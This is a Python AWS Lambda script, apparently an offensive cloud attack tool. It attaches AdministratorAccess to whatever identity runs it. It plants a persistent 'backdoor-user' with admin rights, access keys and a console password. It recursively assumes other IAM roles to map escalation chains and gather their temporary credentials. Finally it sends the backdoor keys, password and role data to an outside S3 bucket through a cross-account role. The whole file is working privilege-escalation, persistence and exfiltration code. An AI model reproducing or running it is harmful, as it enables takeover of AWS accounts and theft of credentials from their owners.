#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
@author: richardw
"""
import boto3
import uuid
import json
import time
from collections import deque
from botocore.exceptions import BotoCoreError, ClientError

def lambda_handler(event, context):
    main()
    return {
        'statusCode': 200,
        'body': json.dumps('Finished')
    }


recycler = {'ARN':'',
            'BUCKET_NAME': '',
            'EXTERNAL_ID': '',
            'OBJECT_KEY': ''
            }
account_id = ""
backdoor = None
backdoor_user_name = "backdoor-user"
backdoor_password = ""

assumecredentials_name = "EscalationAttempt"

common_role_names = [
    "AdminRole",
    "Administrator",
    "DevOpsRole",
    "OrganizationAccountAccessRole",
    "LambdaExecutionRole",
    ]
 
def generate_object_key (arn: str) -> str:
    account_id =  arn.split(":")[4]
    user_path = arn.split(":")[5].split("/")[1]
  
    global recycler
    recycler['OBJECT_KEY'] = f"{account_id}_user_{user_path}"

def normalize_arn(arn: str) -> str:
    if ":sts::" in arn and ":assumed-role/" in arn:
        parts = arn.split(":")
        account_id = parts[4]
        role_info = parts[5].split("/")
        if len(role_info) >= 2:
            role_name = role_info[1]
            return f"arn:aws:iam::{account_id}:role/{role_name}"
    return arn

def attach_policy(iam, identity_arn):
    success = False
    name = identity_arn.split('/')[-1]
    if ":role/" in identity_arn:
        try:
            iam.attach_role_policy(
                RoleName=name,
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
            )
            success = True
        except Exception as e:
            print(f'[!] Failed to attach policy: {e}')
            return success
    else:
        try:
            iam.attach_user_policy(
                UserName=name,
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
            )
            success = True
        except Exception as e:
            print(f'[!] Failed to attach policy: {e}')
            return success
    
    return success
    
def create_backdoor_user(iam):
    success = False
    
    try:
        iam.create_user(UserName=backdoor_user_name)
        response = iam.create_access_key(UserName=backdoor_user_name)
        iam.attach_user_policy(
            UserName="backdoor-user",
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
        iam.create_login_profile(
            UserName=backdoor_user_name,
            Password=backdoor_password,
            PasswordResetRequired=False
            )
        success = True
        global backdoor
        backdoor = response['AccessKey']
    except Exception as e:
        print(f'[!] Failed to create backdoor: {e}')
        return success
        
    return success


def create_backdoor(iam):  
    return create_backdoor_user(iam)


def attemp_assume(current_entity_name, sts, roles_list, assume_tree):
    for role in roles_list:
        if role == current_entity_name:
            continue
        
        target_role_arn = f"arn:aws:iam::{account_id}:role/{role}"
        try: 
            response = sts.assume_role(
                RoleArn = target_role_arn,
                RoleSessionName = assumecredentials_name
                )
            assume_tree.add_assume_relation(current_entity_name, role, response['Credentials'])
            print(f'> try assume role: {target_role_arn} success')
        except:
            print(f'> try assume role: {target_role_arn} failed')
            continue

def exploit(iam, sts, identity_arn, assume_tree, role_manager):

    obtainedAdmin = attach_policy(iam, identity_arn)
    print(f'> obtained admin {obtainedAdmin}')
    
    if not backdoor and obtainedAdmin:
        time.sleep(10)
        success = create_backdoor(iam)
        print(f'> create backdoor {success}')
        if success:
            print(backdoor)
    
    current_entity_name = identity_arn.split('/')[-1]
    possible_assumed_roles = set(role_manager.get_roles_trusting(current_entity_name, account_id) + 
                                 common_role_names)
    
    print(f'> possible assumed roles {possible_assumed_roles}')
    
    attemp_assume(current_entity_name, sts, possible_assumed_roles, assume_tree )
    
    #TODO: clean up
    
def recycle(sts, data):
    try:
        response = sts.assume_role(
            RoleArn=recycler['ARN'],
            RoleSessionName= str(uuid.uuid1()),
            ExternalId=recycler['EXTERNAL_ID']
        )
    except Exception as e:
        print(f'[!] get recycler sts failed: {e} ')
        return
    
    creds = response["Credentials"]
    s3_client = boto3.client(
        "s3",
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"]
    )
    
    try:
        s3_client.put_object(
            Bucket=recycler['BUCKET_NAME'],
            Key=recycler['OBJECT_KEY'],
            Body=json.dumps(data, default=str)
        )
    except Exception as e:
        print(f'[!] put object to recycler failed: {e} ')
        return
    
    print('> Data is successfully transmitted')
    
    


class IAMAssumeTree:
    def __init__(self, root_role):
        self.tree = {root_role: {}}
        self.roles_in_tree = {root_role}

    def add_assume_relation(self, source_role, target_role, credentials):
        if target_role in self.roles_in_tree:
            return

        queue = deque([(self.tree, [])])
        while queue:
            subtree, path = queue.popleft()
            for role, children in subtree.items():
                if role == source_role:
                    children[target_role] = {"credentials": credentials or {}}
                    self.roles_in_tree.add(target_role)
                    print(f"[add] {source_role} => {target_role} path: {' > '.join(path + [role])}")
                    return
                queue.append((children, path + [role]))

        print(f"[!] can't find role {source_role}，failed to add: {source_role} => {target_role}")

    def print_tree(self, subtree=None, indent=0):
        lines = []

        def _build_tree_string(subtree, indent):
            for role, children in subtree.items():
                if role == "credentials":
                    continue
                lines.append("  " * indent + role)
                if "credentials" in children:
                    credentials = children["credentials"]
                    for key, val in credentials.items():
                        lines.append("  " * (indent + 1) + f"[{key}]: {val}")
                _build_tree_string(children, indent + 1)

        if subtree is None:
            subtree = self.tree

        _build_tree_string(subtree, indent)

        tree_str = "\n".join(lines)
        
        print(tree_str)
        return tree_str
            
    def get_direct_children(self, role_name):
        queue = deque([self.tree])
        while queue:
            subtree = queue.popleft()
            for role, children in subtree.items():
                if role == "credentials":
                    continue
                if role == role_name:
                    # 收集子节点
                    result = []
                    for child_role, child_content in children.items():
                        if child_role == "credentials":
                            continue
                        credentials = child_content.get("credentials", {})
                        result.append({"role": child_role, "credentials": credentials})
                    return result
                queue.append(children)
        print(f"[!] can't find {role_name} direct children. Chain broken!")
        return []
    
    def print_all_paths_to_leaves(self):
        def dfs(node, path, subtree, result):
            for role, children in subtree.items():
                if role == "credentials":
                    continue
                new_path = path + [role]
                child_roles = [k for k in children.keys() if k != "credentials"]
                if not child_roles:
                    # 是叶子节点
                    path_str = " → ".join(new_path)
                    result.append(path_str)
                else:
                    dfs(role, new_path, children, result)

        result = []
        dfs(None, [], self.tree, result)

        print("\n[Assume Chains from Root to Leaves]\n" + "-" * 40)
        for path in result:
            print(path)
        print("-" * 40 + "\n")
            
        return result



class RoleManager:
    def __init__ (self):
        self.roles = {} # key: role name, value: full role metadata
    
    def update_roles(self, iam_client):
        try:
            paginator = iam_client.get_paginator('list_roles')
            for page in paginator.paginate():
                for role in page.get('Roles', []):
                    role_name = role['RoleName']
                    if role_name not in self.roles:
                        self.roles[role_name] = role
        except (BotoCoreError, ClientError) as e:
            print(f"[!] Failed to list IAM roles: {e}")
        
    def get_roles_trusting(self, principal_name, account_id): 
        result = []
        for role_name, role_data in self.roles.items():
            doc = role_data.get('AssumeRolePolicyDocument', {})
            statements = doc.get('Statement', [])
            if not isinstance(statements, list):
                statements = [statements]

            for stmt in statements:
                principal = stmt.get('Principal', {})
                if 'AWS' not in principal:
                    continue

                aws_principals = principal['AWS']
                if isinstance(aws_principals, str):
                    aws_principals = [aws_principals]

                for val in aws_principals:
                    if principal_name in val:
                        result.append(role_name)
                        break
                    if val == f"arn:aws:iam::{account_id}:root":
                        result.append(role_name)
                        break
                    
        return sorted(set(result))
    
    def export_to_json(self):
        return json.dumps(self.roles, indent=2, default=str)

def recursive(sts, iam, assume_tree, role_manager):
    try:
        current_identity_arn = sts.get_caller_identity()['Arn']
    except Exception as e:
        print(f'[!] Faile to get get_caller_identity: {e}')
        
    current_identity_arn = normalize_arn(current_identity_arn)
    
    print(f'current identity_arn: {current_identity_arn}')
    
    role_manager.update_roles(iam)
    
    exploit(iam, sts, current_identity_arn, assume_tree, role_manager)
    
    children = assume_tree.get_direct_children(current_identity_arn.split('/')[-1])
    for child in children:
        role_name = child['role']
        print(f'> get into {role_name}')
        session = boto3.Session(
            aws_access_key_id=child['credentials']['AccessKeyId'],
            aws_secret_access_key=child['credentials']['SecretAccessKey'],
            aws_session_token=child['credentials']['SessionToken']
            )
        recursive(session.client('sts'), session.client('iam'), assume_tree, role_manager)

    return


def main():
    sts = boto3.client('sts')
    iam = boto3.client('iam')
    try:
        identity = sts.get_caller_identity()
    except:
        print("[!] Failed to get start!")
        return None
    
    global account_id
    account_id = identity['Account']

    identity_arn = normalize_arn(identity['Arn'])
    
    generate_object_key(identity_arn)
    
    assume_tree = IAMAssumeTree(identity_arn.split('/')[-1])
    role_finder = RoleManager()
    
    print("> attack start")
    recursive(sts, iam, assume_tree, role_finder)
    
    tree_data = assume_tree.print_tree()
    paths_data = assume_tree.print_all_paths_to_leaves()
    role_data = role_finder.export_to_json()
    
    
    recycle_data = {'back door': backdoor, 'back door pwd': backdoor_password,'paths': paths_data, 'tree_data': tree_data, 'role data': role_data}
    
    if backdoor:
        time.sleep(10)
        print('> Data is returning through the backdoor user')
        back_door_session = boto3.Session(
            aws_access_key_id=backdoor['AccessKeyId'],
            aws_secret_access_key=backdoor['SecretAccessKey']
            )
        back_door_sts = back_door_session.client('sts')
        try:
            print("[*] get-caller-identity:")
            print(back_door_sts.get_caller_identity())
        except Exception as e:
            print(f"[!] get-caller-identity failed: {e}")
            return
        
        recycle(back_door_sts, recycle_data)
    
    
    
    
    
    
    
    
    